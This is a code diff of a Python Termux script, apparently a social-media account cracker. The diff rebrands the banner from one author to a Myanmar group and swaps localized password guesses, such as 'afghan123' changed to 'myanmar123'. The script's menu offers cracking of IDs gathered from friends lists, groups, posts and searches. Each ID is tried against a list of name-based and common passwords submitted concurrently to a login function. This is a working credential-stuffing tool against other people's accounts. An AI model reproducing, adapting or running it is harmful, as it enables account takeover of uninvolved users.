@@ -23,27 +23,21 @@ def clear():
     os.system('clear')
 def baner():    
     print(f'''
-\033[1;94m██╗░░██╗██╗███╗░░██╗░██████╗░
-\033[1;93m██║░██╔╝██║████╗░██║██╔════╝░
-\033[1;92m█████═╝░██║██╔██╗██║██║░░██╗░
-\033[1;95m██╔═██╗░██║██║╚████║██║░░╚██╗
-\033[1;91m██║░╚██╗██║██║░╚███║╚██████╔╝
-\033[1;91m╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
+\033[1;93m███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗     
+\033[1;93m████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║    
+\033[1;92m██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║    
+\033[1;92m██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║      
+\033[1;91m██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝      
+\033[1;91m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░      
 
-\033[1;99m░█████╗░███████╗░██████╗░██╗░░██╗░█████╗░███╗░░██╗
-\033[1;91m██╔══██╗██╔════╝██╔════╝░██║░░██║██╔══██╗████╗░██║
-\033[1;92m███████║█████╗░░██║░░██╗░███████║███████║██╔██╗██║
-\033[1;97m██╔══██║██╔══╝░░██║░░╚██╗██╔══██║██╔══██║██║╚████║
-\033[1;93m██║░░██║██║░░░░░╚██████╔╝██║░░██║██║░░██║██║░╚███║
-\033[1;92m╚═╝░░╚═╝╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
-
-
-\033[1;92m--------------------------------------------------➤
-\033[1;93m➣ Author      : Mohammad Sultani
-\033[1;93m➣ GitHub      : https://github.com/mohammadjan1122
-\033[1;93m➣ YouTube     : Termux Master
-\033[1;92m➣ Telegram    : https://t.me/sultani1122
-\033[1;92m--------------------------------------------------➤
+\033[1;95m---------------------- \033[1;94mNew Version 1.0---------------------------➤  
+\033[1;91m.                   TERMUX MY4NM4R TEAM　 
+\033[1;97m.　                  Brand: B4BY DR4GON
+\033[1;95m.                  　 Creation: M4RMU
+\033[1;96m.                   тεcнησℓσgү вү мαямυ
+\033[1;92m.                                                B4BY
+\033[1;92m.                                                  DR4G0N
+\033[1;95m------------------------- \033[1;93mM4RMU -------------------------➤
   ''')
     print('' + Back.BLUE + Fore.BLACK + '        Creator : mohammad_sultani         \033[00m')
     print()
@@ -212,13 +206,13 @@ def menu():
     baner()
     nid()
     print('''
-\033[93m1). \033[00mCrack From Friends
-\033[93m2). \033[00mCrack From Target Friends(publik id )
-\033[93m3). \033[00mCrack From  Post
-\033[93m4). \033[00mCrack From Group
-\033[93m5). \033[00mCrack From Search
-\033[93m6). \033[00mCrack From Requests Friends
-\033[93m0). \033[00mExit''')
+\033[97m1). \033[00mCrack From Friends
+\033[97m2). \033[00mCrack From Target Friends(publik id )
+\033[97m3). \033[00mCrack From  Post
+\033[97m4). \033[00mCrack From Group
+\033[97m5). \033[00mCrack From Search
+\033[97m6). \033[00mCrack From Requests Friends
+\033[97m0). \033[00mExit''')
     pilih_menu()
 def pilih_menu():
     ff=input('\033[00m>> \033[93m')
@@ -239,9 +233,9 @@ def pilih_menu():
                          str(x) + '12345',
                          str(x) + '123456'
                          ]
-                    litpas.append('100200')
+                    litpas.append('102030')
                     litpas.append('500600')
-                    litpas.append('78678y')
+                    litpas.append('654321')
                     litpas.append('100200300')
                     for passw in set(litpas):
                         ex.submit(login,(aa[1]),(passw))
@@ -273,8 +267,8 @@ def pilih_menu():
                          str(x) + '12345',
                          str(x) + '123456'
                          ]
-                    litpas.append('100200')
-                    litpas.append('300400')
+                    litpas.append('102030')
+                    litpas.append('123456789')
                     litpas.append('786786')
                     litpas.append('500600')
                     for passw in set(litpas):
@@ -306,10 +300,10 @@ def pilih_menu():
                            str(x) + '123456'
                            ]
                       litpas.append('100200')
-                      litpas.append('300400')
+                      litpas.append('007007')
                       litpas.append('786786')
-                      litpas.append('afghanistan')
-                      litpas.append('786786')
+                      litpas.append('iloveyou')
+                      litpas.append('654321')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -333,8 +327,8 @@ def pilih_menu():
                       litpas.append('100200')
                       litpas.append('100200300')
                       litpas.append('786786')
-                      litpas.append('afghan123')
-                      litpas.append('786786')
+                      litpas.append('myanmar123')
+                      litpas.append('654321')
                       for passw in set(litpas):
                           ex.submit(login,(aa[1]),(passw))
          print('\n\033[00m[\033[96m*\033[00m]Done.')
@@ -357,7 +351,7 @@ def pilih_menu():
                            ]
                       litpas.append('100200')
                       litpas.append('100200300')
-                      litpas.append('afg123')
+                      litpas.append('myanmar123')
                       litpas.append('123456789')
                       litpas.append('786786')
                       for passw in set(litpas):
